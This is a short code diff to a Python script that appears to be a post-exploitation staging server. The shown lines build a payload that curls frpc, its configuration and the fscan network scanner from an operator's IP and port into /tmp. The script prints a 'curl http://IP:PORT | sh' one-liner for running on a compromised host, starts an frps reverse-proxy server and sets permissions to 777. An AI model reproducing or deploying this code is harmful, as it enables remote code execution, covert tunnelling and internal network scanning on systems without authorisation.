@@ -44,6 +44,8 @@ def root():
     replace(CACHE_PATH + FRPCNAME, CACHE_PATH + FRPCNAME, "{{frpsport}}", str(FRPSPORT))
     replace(RESOURCE_PATH + "frps.ini", CACHE_PATH + FRPSNAME, "{{frpsport}}", str(FRPSPORT))
 
+    os.popen(RESOURCE_PATH + "frps -c " + CACHE_PATH + FRPSNAME + " &")
+
     code = '''curl http://{IP}:{PORT}/frpc -o /tmp/frpc && 
     curl http://{IP}:{PORT}/frpcini -o /tmp/frpc.ini && 
     curl http://{IP}:{PORT}/fscan -o /tmp/fscan && 
@@ -79,7 +81,6 @@ if __name__ == "__main__":
         print('eg: python3 app.py 1.1.1.1 12345')
         sys.exit()
     os.popen("chmod -R 777 .")
-    os.popen(RESOURCE_PATH + "frps -c " + CACHE_PATH + FRPSNAME + " &")
     IP = sys.argv[1]
     PORT = sys.argv[2]
     print("[+] curl http://{}:{} | sh".format(IP, PORT))
